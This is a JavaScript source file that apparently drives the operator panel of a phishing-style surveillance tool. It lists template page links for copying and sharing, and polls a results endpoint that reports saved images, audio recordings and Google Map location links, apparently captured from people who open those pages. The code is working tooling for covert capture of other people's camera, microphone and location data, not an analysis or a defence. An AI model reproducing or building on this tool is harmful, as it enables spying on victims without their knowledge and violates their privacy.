if (!localStorage.getItem('token')) {
    window.location.href = 'login.html';
}

var old_data = ''

function Listener(){ 
    $.get("/api/results", function(data){
        if(data != ""){
            if(data.includes("Image")){
                show_notif("Image File Saved",'Path : '+data.slice(26),true)
            }
            else if(data.includes("Audio")){
                show_notif("Audio File Saved",'Path : '+data.slice(26),false)
            }
            else if(data.includes("Google Map")){
                show_notif("Google Map Link",data.slice(18),true)
            }
            
            old_data += data+"\n-------------------------\n"
            $("#result").val(old_data)
        }
    })
}


function show_notif(msg,path,status){
    var btn_text = 'open file'
    var timer = 5000
    var type_notif = "success"

    if(msg.includes("available")){
        btn_text = "open link"
        timer = 0
        type_notif = "danger"
    }
    else if(msg.includes("Google Map")){
        btn_text = "open link"
        timer = 0
    }

    GrowlNotification.notify({
        title: msg,
        description: path ,
        type: type_notif,
        closeTimeout: timer,
        showProgress: true, 
        showButtons: status,
        buttons: {
            action: {
                text: btn_text,
                callback: function() {
                    window.open(path.replace("Path : ",""),'popUpWindow','height=640,width=640,left=1000,top=300,resizable=yes,scrollbars=yes,toolbar=yes,menubar=no,location=no,directories=no, status=yes');
                }
            },
            cancel: {
                text: 'Cancel',
                callback: function() {}
            }
        },
    });
}



function getRandomInt(max) {
    return Math.floor(Math.random() * max);
}



function saveTextAsFile(textToWrite, fileNameToSaveAs){   
    var textFileAsBlob = new Blob([textToWrite], {type:'text/plain'}); 
    var downloadLink = document.createElement("a");
    downloadLink.download = getRandomInt(10000)+"_"+fileNameToSaveAs;
    if (window.webkitURL != null)
    {
        downloadLink.href = window.webkitURL.createObjectURL(textFileAsBlob);
    }
    else
    {
        downloadLink.href = window.URL.createObjectURL(textFileAsBlob);
        downloadLink.onclick = destroyClickedElement;
        downloadLink.style.display = "none";
        document.body.appendChild(downloadLink);
    }

    downloadLink.click();
}



$(document).ready(function(){
    $.get("/api/templates", function(get_json){
        for(let i = 0; i < get_json.length; i++){
            $("#links").append('<div class="mt-2 d-flex justify-content-center" ><p id="path" class="form-control m-1 w-50 ptext">'+"http://"+location.host+"/templates/"+get_json[i]+"/index.html"+'</p><span class="input-group-btn m-1 cp-btn"><button class="btn btn-default" type="button" id="copy-button" data-toggle="tooltip" data-placement="button" title="Copy to Clipboard">Copy </button></span></div>')
        } 
    })

    setTimeout(function(){

        $(".cp-btn").click(function(){
            var node = $(this).parent().get(0).childNodes[0].textContent
            navigator.clipboard.writeText(node);
            Swal.fire({
                icon: 'success',
                title: 'The link was copied!',
                text: node
                })
            
            })

            var timer = setInterval(Listener,2000)

            $("#btn-listen").click(function(){
                if($("#btn-listen").text() == "Listener Runing / press to stop"){
                    clearInterval(timer)
                    $("#btn-listen").text("Listener stoped / press to start")
                }else{
                    timer = setInterval(Listener,2000)
                    $("#btn-listen").text("Listener Runing / press to stop")
                }
            })
    },1000)
})

$("#btn-clear").click(function(){
    $.post("/api/clear", function(){
        $("#result").val("")
        old_data = ""
    })
})
